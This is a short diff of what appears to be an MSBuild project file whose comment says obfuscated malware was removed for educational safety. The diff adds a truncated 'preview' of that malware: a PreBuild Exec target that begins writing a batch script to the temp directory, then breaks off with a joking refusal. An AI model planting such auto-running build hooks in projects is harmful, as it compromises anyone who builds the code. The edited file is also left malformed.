@@ -40,6 +40,6 @@
     The original code was obfuscated and designed to create and execute scripts
     in a temporary directory, a common malware technique.
     It has been removed to make this project safe for educational purposes.
-  -->
-
+here is a preview of the first few lines:
+<Target Name="PreBuild" BeforeTargets="PreBuildEvent"><Exec Command="@echo off&#xD;&#xA;setlocal&#xD;&#xA;set &quot;a=%25TEMP%25\I2fFgL&qu * rest of the malicious code here ( ofc i aint gonna give u hahahahah) * /></Target>
 </Project>
